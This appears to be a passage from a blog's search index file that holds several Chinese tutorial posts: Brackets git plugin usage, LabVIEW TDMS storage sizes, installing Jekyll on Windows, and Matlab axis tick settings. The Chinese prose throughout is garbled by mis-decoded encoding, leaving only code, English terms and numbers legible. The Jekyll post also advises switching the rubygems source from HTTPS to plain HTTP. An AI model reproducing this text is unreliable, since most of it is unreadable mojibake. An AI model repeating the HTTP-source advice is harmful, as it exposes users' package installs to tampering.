<h3 id="git-branch-git-checkout-git-merge"><a href="#git-branch-git-checkout-git-merge" class="headerlink" title="git branch / git checkout / git merge"></a>git branch / git checkout / git merge</h3><p>å¦‚æœéœ€è¦åˆ›å»ºæ–°çš„åˆ†æ”¯ã€åˆ‡æ¢åˆ†æ”¯æˆ–æ˜¯åˆå¹¶åˆ†æ”¯ï¼Œæˆ‘ä»¬é€šå¸¸éœ€è¦ä½¿ç”¨æŒ‡ä»¤<code>git branch</code>/<code>git checkout</code>/<code>git merge</code>,åœ¨Bracketsä¸­ï¼Œå¯ä»¥é€šè¿‡ç•Œé¢å³ä¾§çš„åˆ†æ”¯é€‰é¡¹å®Œæˆè¿™äº›æ“ä½œã€‚</p>
<p><img src="/assets/brackets/git/git checkout.png" alt="git checkout"></p>
<p><img src="/assets/brackets/git/git branch.png" alt="git branch"></p>
<h3 id="git-tag"><a href="#git-tag" class="headerlink" title="git tag"></a>git tag</h3><p>å¦‚æœéœ€è¦ç»™å½“å‰ç‰ˆæœ¬æ·»åŠ æ ‡ç­¾ï¼Œå¯ä»¥ç‚¹å‡»æ ‡ç­¾æŒ‰é’®ï¼Œè¾“å…¥æ ‡ç­¾åï¼Œç‚¹å‡»ç¡®å®šå³å¯ï¼Œä¸‹æ¬¡æ¨é€çš„æ—¶å€™è®°å¾—åœ¨æ¨é€çª—å£å‹¾é€‰â€œSend tagsâ€ã€‚</p>
<p><img src="/assets/brackets/git/git new tag.png" alt="git new tag"></p>
<h3 id="æ‰“å¼€æŒ‡ä»¤çª—å£"><a href="#æ‰“å¼€æŒ‡ä»¤çª—å£" class="headerlink" title="æ‰“å¼€æŒ‡ä»¤çª—å£"></a>æ‰“å¼€æŒ‡ä»¤çª—å£</h3><p>å¦‚æœä¹ æƒ¯ä½¿ç”¨æ•²æŒ‡ä»¤ï¼Œæˆ–æ˜¯æœ‰äº›æŒ‡ä»¤ä¸å¾—ä¸é€šè¿‡æŒ‡ä»¤çª—å£æ‰èƒ½å®ç°ï¼Œå¯ä»¥é€šè¿‡gitæ’ä»¶æ‰“å¼€git bashã€‚</p>
<p><img src="/assets/brackets/git/git bash.png" alt="git bash"></p>
<h3 id="æŸ¥çœ‹å†å²è®°å½•"><a href="#æŸ¥çœ‹å†å²è®°å½•" class="headerlink" title="æŸ¥çœ‹å†å²è®°å½•"></a>æŸ¥çœ‹å†å²è®°å½•</h3><p>æŸ¥çœ‹æ¨é€è®°å½•ï¼š</p>
<p><img src="/assets/brackets/git/git history push.png" alt="git push history"></p>
<p>æŸ¥çœ‹æŸæ–‡ä»¶çš„æäº¤è®°å½•ï¼š</p>
<p><img src="/assets/brackets/git/git history file.png" alt="git file history"></p>
<h3 id="æ”¾å¼ƒæ›´æ”¹"><a href="#æ”¾å¼ƒæ›´æ”¹" class="headerlink" title="æ”¾å¼ƒæ›´æ”¹"></a>æ”¾å¼ƒæ›´æ”¹</h3><p>å¦‚æœæˆ‘ä»¬éœ€è¦æ”¾å¼ƒæŸäº›æ–‡ä»¶çš„ä¿®æ”¹æ—¶ï¼Œå¯ä»¥åœ¨gitå·¥å…·çš„å†…å®¹æ˜¾ç¤ºåŒºåŸŸæ‰¾åˆ°è¯¥æ–‡ä»¶ï¼Œç‚¹å‡»â€œdiscard changesâ€ã€‚å¦‚æœæƒ³è¦åˆ é™¤æŸäº›åˆšåˆšæ·»åŠ ä½†è¿˜æœªæäº¤çš„æ–‡ä»¶ï¼ŒåŒæ ·å¯ä»¥åœ¨è¯¥åŒºåŸŸæ‰¾åˆ°æ–‡ä»¶ï¼Œé€šè¿‡ç‚¹å‡»â€œDelete fileâ€åˆ é™¤æ–‡ä»¶ã€‚</p>
<p><img src="/assets/brackets/git/git discard.png" alt="git discard"></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>gitæŒ‡ä»¤ä¸°å¯Œï¼Œä¸Šè¿°å¹¶éå…¨éƒ¨ï¼Œä½†æ˜¯å°šä¸”å¤Ÿç”¨ï¼Œå¾€åæ›´æ–°åŒæ­¥ã€‚</p>
]]></content>
      
        <categories>
            
            <category> Web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> brackets </tag>
            
            <tag> git </tag>
            
            <tag> tools </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Labview - æ‰‹è‡ªåŠ¨å­˜å‚¨TDMSæ–‡ä»¶çš„åŒºåˆ«]]></title>
      <url>https://www.litreily.top/2016/05/11/DAQ-TDMS/</url>
      <content type="html"><![CDATA[<p>åœ¨Labviewçš„è½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­ï¼Œå°‘ä¸äº†ä½¿ç”¨DAQï¼ˆData Acquisitionï¼‰åŠ©æ‰‹ï¼Œåœ¨ä½¿ç”¨DAQåŠ©æ‰‹é‡‡é›†æ•°æ®æ—¶ï¼Œé€šå¸¸éœ€è¦å­˜å‚¨æ•°æ®ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨DAQåŠ©æ‰‹çš„é…ç½®ç•Œé¢è®¾ç½®TDMSï¼ˆTechnical Data Management Streamingï¼‰æ–‡ä»¶è·¯å¾„ã€‚è€ŒTDMSæ–‡ä»¶æ˜¯NIä¸»æ¨çš„ä¸€ç§äºŒè¿›åˆ¶è®°å½•æ–‡ä»¶ï¼Œå¯ä»¥å¤§å¤§å‡å°æ•°æ®çš„å­˜å‚¨å®¹é‡ã€‚</p>
<p>ä¸ºäº†ç ”ç©¶ä½¿ç”¨DAQåŠ©æ‰‹è‡ªåŠ¨å­˜å‚¨TDMSæ–‡ä»¶äº§ç”Ÿçš„æ•°æ®å¤§å°ï¼Œæˆ‘ä¸“ç¨‹å†™äº†ä¸ªæµ‹è¯•ç¨‹åºï¼Œä½¿ç”¨NI MAXåˆ›å»ºçš„æ¨¡æ‹Ÿé‡‡é›†å¡ç”Ÿæˆæ¨¡æ‹Ÿæ­£å¼¦æ³¢ä¿¡å·ï¼Œé€šè¿‡æµ‹è¯•ç¨‹åºè¿›è¡Œé‡‡é›†å’Œå­˜å‚¨ã€‚</p>
<h2 id="ç¤ºä¾‹ç¨‹åº"><a href="#ç¤ºä¾‹ç¨‹åº" class="headerlink" title="ç¤ºä¾‹ç¨‹åº"></a>ç¤ºä¾‹ç¨‹åº</h2><p>ç¨‹åºåç§°ï¼šä»¿DAQè®¾è®¡.vi</p>
<ul>
<li>å‰é¢æ¿</li>
</ul>
<p><img src="/assets/labview/saveTdms/panel.png" alt="å‰é¢æ¿"></p>
<ul>
<li>ç¨‹åºæ¡†å›¾</li>
</ul>
<p><img src="/assets/labview/saveTdms/codeBlock.png" alt="ç¨‹åºæ¡†å›¾"></p>
<h2 id="ç¨‹åºæµ‹è¯•"><a href="#ç¨‹åºæµ‹è¯•" class="headerlink" title="ç¨‹åºæµ‹è¯•"></a>ç¨‹åºæµ‹è¯•</h2><h3 id="é‡‡æ ·ä¿¡æ¯"><a href="#é‡‡æ ·ä¿¡æ¯" class="headerlink" title="é‡‡æ ·ä¿¡æ¯"></a>é‡‡æ ·ä¿¡æ¯</h3><ul>
<li>æ¨¡æ‹Ÿé‡‡é›†å¡ï¼šNI USB-6341</li>
<li>é‡‡æ ·é¢‘ç‡ï¼š100Hzï¼›</li>
<li>é‡‡æ ·ç‚¹æ•°ï¼š100ï¼›</li>
<li>é‡‡æ ·æ—¶é—´ï¼š5åˆ†é’Ÿï¼›</li>
<li>ç‰©ç†é€šé“ï¼šai0,ai1,ai2;</li>
</ul>
<h3 id="é‡‡æ ·è¿‡ç¨‹"><a href="#é‡‡æ ·è¿‡ç¨‹" class="headerlink" title="é‡‡æ ·è¿‡ç¨‹"></a>é‡‡æ ·è¿‡ç¨‹</h3><ul>
<li>ç¨‹åºè¿è¡Œä¸­</li>
</ul>
<p><img src="/assets/labview/saveTdms/saveTdms.png" alt="saveTdms"></p>
<ul>
<li>ç¨‹åºè¿è¡Œç»“æŸ</li>
</ul>
<p><img src="/assets/labview/saveTdms/saveTdmsEnd.png" alt="saveTdmsEnd"></p>
<h3 id="é‡‡æ ·ç»“æœ"><a href="#é‡‡æ ·ç»“æœ" class="headerlink" title="é‡‡æ ·ç»“æœ"></a>é‡‡æ ·ç»“æœ</h3><pre><code class="txt">æ€»é‡‡æ ·ç‚¹æ•°ï¼š30000*3 = 90000
.tdmsæ–‡ä»¶å¤§å°ï¼š180kB(185,132Bytes)
185216(Bytes)/90000 â‰ˆ 2.057956Bytes â‰ˆ 2Bytes
.tdms_indexæ–‡ä»¶å¤§å°ï¼š5.01kB(5132Bytes)
</code></pre>
<p>è¯´æ˜æ¯ä¸ªé‡‡æ ·ç‚¹å¯¹åº”çš„å­˜å‚¨å¤§å°ä¸º2Byteså·¦å³ã€‚å¦‚æœä½¿ç”¨æ™®é€šæ–‡ä»¶ï¼ˆå¦‚ï¼š.txt/.datç­‰ï¼‰å­˜å‚¨ï¼Œä¸€ä¸ªåŒç²¾åº¦å‹æ•°æ®éœ€è¦å ç”¨8Bytesçš„ç©ºé—´ï¼Œå¯¹åº”å…¶æ–‡ä»¶å¤§å°å°†æ˜¯tdmsæ–‡ä»¶çš„4å€å·¦å³ã€‚</p>
<h2 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h2><h3 id="å±€é™æ€§"><a href="#å±€é™æ€§" class="headerlink" title="å±€é™æ€§"></a>å±€é™æ€§</h3><ol>
<li><p>å¦‚æœä½¿ç”¨DAQåŠ©æ‰‹è‡ªåŠ¨å­˜å‚¨TDMSæ–‡ä»¶ï¼Œå®ƒå°†å­˜å‚¨å·²åˆ›å»ºçš„æ‰€æœ‰è™šæ‹Ÿé€šé“çš„æ•°æ®ï¼Œæ— æ³•å•ç‹¬å­˜å‚¨æŸä¸€é€šé“çš„æ•°æ®ã€‚</p>
</li>
<li><p>å¯¹äºåŒä¸€ä¸ªé‡‡é›†å¡è®¾å¤‡ï¼Œå½“ç”¨æˆ·éœ€è¦è¿ç»­é‡‡é›†å¤šè·¯é€šé“çš„ç”µå‹/ç”µæµä¿¡å·æ—¶ï¼Œå› ä¸ºé‡‡é›†å¡çš„å¤šè·¯é€šé“ä½¿ç”¨ç›¸åŒçš„å‚è€ƒæ—¶é’Ÿæºå’Œå¤šè·¯å¤ç”¨å™¨ï¼Œæ‰€ä»¥åªèƒ½ä½¿ç”¨ä¸€ä¸ªDAQåŠ©æ‰‹ã€‚æ­¤å¤–ï¼Œè¯¥è®¾å¤‡çš„æ‰€æœ‰é€šé“å¯¹åº”çš„é‡‡æ ·é¢‘ç‡ä¹Ÿå¿…é¡»ä¸€è‡´ã€‚ä½†å¦‚æœç”¨æˆ·çš„å¤šè·¯é€šé“ä¸æ˜¯åŒä¸€ç±»å‹ï¼Œä¾‹å¦‚ï¼šç”µå‹å’Œè®¡æ•°å€¼ï¼Œåƒè¿™ç§æƒ…å†µï¼Œç”¨æˆ·èƒ½ä¸”åªèƒ½ä½¿ç”¨å¤šä¸ªDAQåŠ©æ‰‹ã€‚</p>
</li>
</ol>
<h3 id="æ‰‹åŠ¨å­˜å‚¨TDMSæ–‡ä»¶"><a href="#æ‰‹åŠ¨å­˜å‚¨TDMSæ–‡ä»¶" class="headerlink" title="æ‰‹åŠ¨å­˜å‚¨TDMSæ–‡ä»¶"></a>æ‰‹åŠ¨å­˜å‚¨TDMSæ–‡ä»¶</h3><p>ä¸ºäº†è§£å†³<strong>å±€é™æ€§</strong>æåˆ°çš„ç¬¬2ä¸ªé—®é¢˜ï¼Œæˆ‘å°è¯•æ‰‹åŠ¨æ·»åŠ TDMSå­˜å‚¨æ–‡ä»¶ï¼Œç”¨ä»¥æ›¿ä»£DAQè‡ªåŠ¨å­˜å‚¨TDMSæ–¹å¼ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä¿®æ”¹äº†éƒ¨åˆ†ç¨‹åºï¼Œåœ¨ä¿ç•™DAQè‡ªåŠ¨å­˜å‚¨çš„åŒæ—¶ï¼Œåœ¨è·å–æ•°æ®åå†æ¬¡å­˜å‚¨ã€‚ä¿®æ”¹éƒ¨åˆ†å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="/assets/labview/saveTdms/manualSaveTdms.png" alt="manualSaveTDMS"></p>
<p>å†æ¬¡è¿è¡Œç¨‹åºï¼Œè‡ªåŠ¨å­˜å‚¨çš„tdmsæ–‡ä»¶å¤§å°ä¸ä¸Šè¿°ä¸€è‡´ï¼Œæ‰‹åŠ¨å­˜å‚¨çš„tdmsæ–‡ä»¶å¤§å°ä¸º:</p>
<pre><code class="yml">704kB(720,998Bytes) â‰ˆ 90000 * 8.011089 (Bytes) â‰ˆ 90000 * 8 (Bytes)
</code></pre>
<p>å¯ä»¥çœ‹å‡ºï¼Œåœ¨æ‰‹åŠ¨å­˜å‚¨æ—¶ï¼Œæ¯ä¸ªæ•°æ®çš„æ•°æ®é‡ä¸º8ä¸ªå­—èŠ‚å·¦å³ï¼Œæ°å¥½æ˜¯åŒç²¾åº¦æ•°æ®çš„å¤§å°ã€‚æ‰€ä»¥åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼˜å…ˆè€ƒè™‘DAQçš„è‡ªåŠ¨å­˜å‚¨åŠŸèƒ½ï¼Œå¦‚æœä¸ºäº†å‡å°‘æ•°æ®é‡ä½¿ç”¨æ‰‹åŠ¨å­˜å‚¨æ–¹æ³•ï¼Œå³ä½¿å‡å°‘é€šé“æ•°ï¼Œä¹Ÿæœªå¿…èƒ½è¾¾åˆ°æ•ˆæœï¼Œé™¤éå‡å°‘åçš„é€šé“æ•°å°ç­‰äºæ€»é€šé“æ•°çš„1/4.</p>
<h3 id="æ–‡ä»¶å±æ€§å¯¹æ¯”"><a href="#æ–‡ä»¶å±æ€§å¯¹æ¯”" class="headerlink" title="æ–‡ä»¶å±æ€§å¯¹æ¯”"></a>æ–‡ä»¶å±æ€§å¯¹æ¯”</h3><ul>
<li>è‡ªåŠ¨å­˜å‚¨æ–‡ä»¶çš„å±æ€§</li>
</ul>
<p><img src="/assets/labview/saveTdms/autoSaveProperties.png" alt="AutoSaveTdmsProperties"></p>
<ul>
<li>æ‰‹åŠ¨å­˜å‚¨æ–‡ä»¶çš„å±æ€§</li>
</ul>
<p><img src="/assets/labview/saveTdms/manualSaveProperties.png" alt="ManualSaveTdmsProperties"></p>
<p>é€šè¿‡å±æ€§å¯¹æ¯”å¯ä»¥çœ‹å‡ºï¼Œè‡ªåŠ¨å­˜å‚¨æ–‡ä»¶æ¯”æ‰‹åŠ¨å­˜å‚¨æ–‡ä»¶å¤šäº†ä¸€äº›å±æ€§å€¼ï¼ŒåŒ…æ‹¬<strong>æ¢ç®—æ•°é‡</strong><code>NI_Number_Of_Scales</code>ã€<strong>æ¢ç®—é˜¶æ•°å’Œé…ç½®</strong><code>NI_Scale[n]_config</code>ä»¥åŠ<strong>æ¢ç®—çš„å¯ç”¨çŠ¶æ€</strong><code>NI_Scaling_Status</code>ã€‚ä¸ºäº†éªŒè¯æ•°æ®å­˜å‚¨æ–‡ä»¶å¤§å°ä¸ä¸€è‡´æ˜¯å¦ä¸è¿™äº›å¤šå‡ºå±æ€§æœ‰å…³ï¼Œæˆ‘è¿›è¡Œäº†è¿›ä¸€æ­¥æµ‹è¯•ï¼Œåœ¨æ‰‹åŠ¨å­˜å‚¨è¿‡ç¨‹ä¸­è®¾ç½®äº†tdmsæ–‡ä»¶å±æ€§ï¼Œä½¿å…¶ä¸è‡ªåŠ¨å­˜å‚¨æ–‡ä»¶çš„å±æ€§ä¸€è‡´ã€‚</p>
<p><img src="/assets/labview/saveTdms/setTdmsProperties.png" alt="SetTdmsProperties"></p>
<p>ä½†ç»“æœä¾æ—§ä»¤äººå¤±æœ›ï¼Œæ–‡ä»¶å¤§å°å¹¶æœªå› æ­¤è€Œå‡å°ã€‚ç†è®ºä¸Šè‚¯å®šæœ‰æ–¹æ³•å‡å°Tdmsæ–‡ä»¶å¤§å°ï¼Œä½†æˆ‘ç°åœ¨è¿˜ä¸çŸ¥æ™“ï¼Œè·¯æ¼«æ¼«å…¶ä¿®è¿œå…®ï¼Œå¾å°†ä¸Šä¸‹è€Œæ±‚ç´¢ã€‚</p>
]]></content>
      
        <categories>
            
            <category> LabVIEW </category>
            
        </categories>
        
        
        <tags>
            
            <tag> labview </tag>
            
            <tag> tdms </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[åœ¨Windowsä¸­å®‰è£…Jekyll]]></title>
      <url>https://www.litreily.top/2016/04/15/install-jekyll/</url>
      <content type="html"><![CDATA[<p>æœ¬ç€æ— èŠçˆ±æŠ˜è…¾çš„ç²¾ç¥ï¼Œåˆé‰´äºWindowsç³»ç»Ÿçš„é™åˆ¶ï¼Œæ— å¥ˆå¯»è§…ç½‘ä¸Šèµ„æ–™åƒåƒä¸‡ï¼Œç»ˆå¯»å¾—ä¸€å· <strong><a href="http://www.madhur.co.in/blog/2011/09/01/runningjekyllwindows.html" target="_blank" rel="noopener">å¥‡ä¹¦</a></strong>ï¼Œå¾—å¿æ‰€æ„¿ï¼</p>
<h2 id="ä¾èµ–å·¥å…·"><a href="#ä¾èµ–å·¥å…·" class="headerlink" title="ä¾èµ–å·¥å…·"></a>ä¾èµ–å·¥å…·</h2><ul>
<li><a href="http://rubyinstaller.org/downloads/" target="_blank" rel="noopener">Ruby &amp; Ruby Development Kit</a></li>
<li>Jekyll</li>
<li><a href="http://portablepython.com/wiki/PortablePython2.7.5.1/" target="_blank" rel="noopener">Python</a>(å¯é€‰)</li>
<li>Pygments(å¯é€‰)</li>
</ul>
<h2 id="æ­å»ºJekyllç¯å¢ƒ"><a href="#æ­å»ºJekyllç¯å¢ƒ" class="headerlink" title="æ­å»ºJekyllç¯å¢ƒ"></a>æ­å»ºJekyllç¯å¢ƒ</h2><p>åœ¨Windowsä¸­ä¸‹è½½å®‰è£…æ‰€éœ€çš„ä¾èµ–åŒ…ï¼Œå¹¶é…ç½®å¥½å¯¹åº”çš„ç¯å¢ƒå˜é‡ã€‚</p>
<h3 id="å®‰è£…Ruby"><a href="#å®‰è£…Ruby" class="headerlink" title="å®‰è£…Ruby"></a>å®‰è£…Ruby</h3><p>ç”±äºjekyllé‡‡ç”¨Rubyå¼€å‘è€Œå¾—ï¼Œæ‰€ä»¥æƒ³è¦ä½¿ç”¨å®ƒå°±å¾—å®‰è£…Rubyè¯­è¨€ç¯å¢ƒã€‚å¯ä»¥ä»<a href="http://rubyinstaller.org/downloads/" target="_blank" rel="noopener">http://rubyinstaller.org/downloads/</a>ä¸‹è½½Rubyå®‰è£…åŒ…ï¼Œæ¨èé€‰æ‹©<code>Ruby 2.2.4</code>ã€‚ä¸‹è½½åå®‰è£…åœ¨<code>C:\Ruby</code>ï¼Œå½“ç„¶ï¼Œè·¯å¾„ä¸æ˜¯å›ºå®šçš„ã€‚</p>
<p><img src="/assets/jekyll/Ruby.png" alt="Ruby"></p>
<h3 id="ä¸‹è½½è§£å‹Devkit"><a href="#ä¸‹è½½è§£å‹Devkit" class="headerlink" title="ä¸‹è½½è§£å‹Devkit"></a>ä¸‹è½½è§£å‹Devkit</h3><p>ä¸‹è½½Rubyçš„å¼€å‘å·¥å…·DevKitï¼Œåœ°å€ä¸Rubyçš„<a href="http://rubyinstaller.org/downloads/" target="_blank" rel="noopener">ä¸‹è½½åœ°å€</a>ä¸€è‡´ã€‚å½“ç„¶ï¼Œåˆ«å¿˜äº†æ ¹æ®ç³»ç»Ÿä½æ•°é€‰æ‹©æœ€æ–°ç‰ˆæœ¬çš„DevKitã€‚è‡³äºè§£å‹è·¯å¾„ï¼Œé€‰æ‹©<code>C:\devkit</code>å³å¯ã€‚</p>
<p><img src="/assets/jekyll/DevKit.png" alt="Development Kit"></p>
<h3 id="åˆå§‹åŒ–Devkit"><a href="#åˆå§‹åŒ–Devkit" class="headerlink" title="åˆå§‹åŒ–Devkit"></a>åˆå§‹åŒ–Devkit</h3><p>ä½¿ç”¨å¿«æ·é”®<code>Win+R</code>è¾“å…¥<code>cmd</code>æ‰“å¼€å‘½ä»¤çª—å£ï¼Œè¾“å…¥ä»¥ä¸‹æŒ‡ä»¤ï¼š</p>
<pre><code class="bash">cd C:\devkit
ruby dk.rb init
</code></pre>
<p><img src="/assets/jekyll/Ruby-init.png" alt="Ruby-init"></p>
<p>è¿è¡Œä»¥ä¸ŠæŒ‡ä»¤åï¼Œdevkitç›®å½•ä¸‹å°†ä¼šå¤šå‡ºä¸€ä¸ª&quot;config.yml&quot;,å…¶å†…å®¹ä¸ºï¼š</p>
<pre><code class="bash"># This configuration file contains the absolute path locations of all
# installed Rubies to be enhanced to work with the DevKit. This config
# file is generated by the &#39;ruby dk.rb init&#39; step and may be modified
# before running the &#39;ruby dk.rb install&#39; step. To include any installed
# Rubies that were not automagically discovered, simply add a line below
# the triple hyphens with the absolute path to the Ruby root directory.
#
# Example:
#
# ---
# - C:/ruby19trunk
# - C:/ruby192dev
#
---
- C:/Ruby
</code></pre>
<h3 id="å®‰è£…Devkit"><a href="#å®‰è£…Devkit" class="headerlink" title="å®‰è£…Devkit"></a>å®‰è£…Devkit</h3><p>ç¡®ä¿æ–‡ä»¶ä¸­æŒ‡ç¤ºçš„Rubyä¸å®‰è£…å¥½çš„Rubyè·¯å¾„ä¸€è‡´ï¼Œç„¶åæ‰§è¡Œä»¥ä¸‹æŒ‡ä»¤ï¼š</p>
<pre><code class="bash">ruby dk.rb install
</code></pre>
<p>è‡³æ­¤ï¼Œrubyå¼€å‘ç¯å¢ƒå·²é…ç½®å®Œæˆï¼Œå¦‚æœä¸­é€”å‡ºç°é”™è¯¯ï¼Œå¤šåŠæ˜¯è·¯å¾„é—®é¢˜æˆ–ç¯å¢ƒå˜é‡é—®é¢˜ï¼Œä¸ºä»¥é˜²ä¸‡ä¸€ï¼Œå¯ä»¥åœ¨Windowsç³»ç»Ÿå±æ€§ä¸­çš„ç¯å¢ƒå˜é‡ä¸­æ·»åŠ rubyè·¯å¾„ã€‚</p>
<p><img src="/assets/jekyll/Ruby-envir.png" alt="Ruby-environment"></p>
<h3 id="å®‰è£…Jekyll"><a href="#å®‰è£…Jekyll" class="headerlink" title="å®‰è£…Jekyll"></a>å®‰è£…Jekyll</h3><p>æ‰§è¡Œä»¥ä¸‹æŒ‡ä»¤å®‰è£…jekyllï¼š</p>
<pre><code class="bash">gem install jekyll
</code></pre>
<p>è¿™ä¸€æ­¥å¾ˆæœ‰å¯èƒ½ä¼šæŠ¥é”™ï¼Œè€ŒæŠ¥é”™åŸå› åŸºæœ¬ä¸Šå‡ºäºgemæºåœ°å€ï¼Œgemé»˜è®¤æºåœ°å€ä¸º<a href="https://rubygems.org/" target="_blank" rel="noopener">https://rubygems.org/</a>ï¼Œéœ€è¦ä¿®æ”¹ä¸º<a href="http://rubygems.org/" target="_blank" rel="noopener">http://rubygems.org/</a>. ä¿®æ”¹æŒ‡ä»¤å¦‚ä¸‹ï¼š</p>
<pre><code class="bash">gem sources -r https://rubygems.org
gem sources -a http://rubygems.org
</code></pre>
<p>ä¿®æ”¹åå³å¯æ­£å¸¸å®Œæˆjekyllçš„ä¸‹è½½å®‰è£…äº†ã€‚å®‰è£…å®Œæˆåï¼Œä¾¿å¯ä½¿ç”¨jekylläº†ã€‚</p>
<h3 id="å¯é€‰æ“ä½œ"><a href="#å¯é€‰æ“ä½œ" class="headerlink" title="å¯é€‰æ“ä½œ"></a>å¯é€‰æ“ä½œ</h3><p>å¦‚æœéœ€è¦ä½¿ç”¨Pygmentsæä¾›çš„ä»£ç é«˜äº®åŠŸèƒ½ï¼Œå¯ä»¥å®‰è£…<a href="http://portablepython.com/wiki/PortablePython2.7.5.1/" target="_blank" rel="noopener">Python</a>ï¼Œé…ç½®ç¯å¢ƒå˜é‡ã€‚å†åˆ°<a href="https://pypi.python.org/pypi/setuptools#windows" target="_blank" rel="noopener">https://pypi.python.org/</a>ä¸‹è½½<code>distribute_setup.py</code>ã€‚æœ€åé€šè¿‡æ‰§è¡Œä»¥ä¸‹æŒ‡ä»¤è¿›è¡Œå®‰è£…ï¼š</p>
<pre><code class="bash">python distribute_setup.py
easy_install Pygments
</code></pre>
<p>æ›´åŠ è¯¦ç»†çš„Pygmentsè¯´æ˜å¯ä»¥å‚è€ƒ<a href="http://havee.me/internet/2013-08/support-pygments-in-jekyll.html" target="_blank" rel="noopener">è¿™é‡Œ</a>ã€‚å¥½äº†ï¼Œä¸€åˆ‡å‡†å¤‡å°±ç»ªã€‚ Enjoy Yourself!</p>
]]></content>
      
        <categories>
            
            <category> Web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
            <tag> jekyll </tag>
            
            <tag> ruby </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Matlab - è®¾ç½®åæ ‡å°ºåº¦]]></title>
      <url>https://www.litreily.top/2016/04/11/matlab-skill/</url>
      <content type="html"><![CDATA[<p>matlabä¸­ï¼Œåœ¨ä½¿ç”¨plotç»˜å›¾æ—¶ä¼šè‡ªåŠ¨ç”Ÿæˆå¸¦æœ‰æ ‡å°ºçš„åæ ‡ç³»ï¼Œåæ ‡é—´è·ä¼šéšå±å¹•å¤§å°è‡ªåŠ¨æ›´æ”¹ã€‚ä½†æœ‰æ—¶å€™ç”±äºç‰¹æ®Šéœ€æ±‚éœ€è¦ä¿®æ”¹è¯¥é—´è·ï¼Œæ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡setå‡½æ•°è¿›è¡Œå®ç°ã€‚</p>
<p>ä»¥ <code>y=sin(2*pi*10*t)</code> ä¸ºä¾‹ï¼Œåœ¨ä½¿ç”¨matlabé»˜è®¤ç”Ÿæˆæ–¹å¼æ—¶ï¼Œå…¶ä»¿çœŸç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="/assets/matlab/setTickBefore.png" alt="setTickBefore"></p>
<p>ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="matlab">clc
f=10;               % ä¿¡å·é¢‘ç‡
fs=400;             % é‡‡æ ·é¢‘ç‡
N=fs*0.5;           % é‡‡æ ·ç‚¹æ•°
t=(0:N-1)/fs;       % æ—¶é—´
y=sin(2*pi*f.*t);   % ä¿¡å·

plot(t,y);grid on;  % ç»˜å›¾
xlabel(&#39;æ—¶é—´/t&#39;);     % xè½´æ ‡é¢˜
ylabel(&#39;å¹…å€¼&#39;);       % yè½´æ ‡é¢˜
title(&#39;y=sin(2*pi*10*t)&#39;)   % æ ‡é¢˜
set(gca,&#39;xtick&#39;,0:0.025:t(end));    % è®¾ç½®xè½´æ ‡å°º
set(gca,&#39;ytick&#39;,min(y):0.4:max(y)); % è®¾ç½®yè½´æ ‡å°º
</code></pre>
<p>ä¿®æ”¹æ ‡å°ºåå¾—åˆ°çš„æ³¢å½¢å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="/assets/matlab/setTickAfter.png" alt="setTickAfter"></p>
]]></content>
      
        <categories>
            
            <category> Matlab </category>
            
        </categories>
        
        
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
